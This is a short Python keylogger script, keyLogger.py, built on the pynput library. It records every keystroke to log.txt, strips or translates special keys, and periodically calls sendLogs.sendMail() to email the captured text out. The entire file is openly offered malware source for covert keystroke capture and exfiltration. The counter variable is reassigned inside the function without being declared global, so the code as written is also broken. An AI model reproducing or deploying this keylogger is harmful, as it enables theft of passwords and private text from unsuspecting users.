#!python3
#keyLogger.py- keylogger using pynput library

import sendLogs
from pynput.keyboard import Listener
counter = 0
def writeInFile(key):
    if counter > 10:
        sendLogs.sendMail()
        counter = 0
    alphabet = str(key)
    alphabet = alphabet.replace("'","")
    if alphabet == 'Key.space':
        alphabet = ' '
    if alphabet == 'Key.enter':
        alphabet = '\n'
    if alphabet == 'Key.shift':
        alphabet = ''
    if alphabet == 'Key.tab':
        alphabet = '\t'
    if alphabet == 'Key.up' or alphabet == 'Key.down' or alphabet == 'Key.left' or alphabet == 'Key.right':
        alphabet = ''
    if alphabet == 'Key.ctrl_l' or alphabet == 'Key.ctrl_r':
        alphabet = ''
    with open('log.txt','a') as file:
        file.write(alphabet)
    counter += 1
with Listener(on_press=writeInFile) as listen:
    listen.join()
